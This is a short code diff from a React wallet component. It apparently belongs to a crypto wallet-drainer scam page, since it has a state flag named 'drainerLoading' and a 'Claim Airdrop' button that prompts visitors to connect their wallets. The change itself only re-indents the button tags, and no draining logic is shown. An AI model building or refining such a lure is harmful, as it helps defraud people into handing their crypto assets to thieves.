@@ -104,14 +104,14 @@ function WalletUI() {
 
   return (
     <div className="flex flex-col items-center gap-4">
-      <button
+              <button
         onClick={handleConnect}
         className={`bg-yellow-400 text-black px-8 py-4 rounded-full text-xl font-semibold hover:bg-yellow-500 transition disabled:opacity-60 ${drainerLoading ? 'animate-bounce' : ''}`}
         disabled={connecting || checkingBalance || drainerLoading}
         aria-label={isConnected ? 'Manage Wallet' : 'Connect Wallet'}
       >
         {connecting || checkingBalance || drainerLoading ? 'Checking...' : isConnected ? 'Manage Wallet' : 'Claim Airdrop'}
-      </button>
+              </button>
       {error && <span className="text-red-400 font-semibold mt-2">{error}</span>}
       {isConnected && (
         <span className="text-green-400 font-semibold mt-2 flex items-center gap-2">
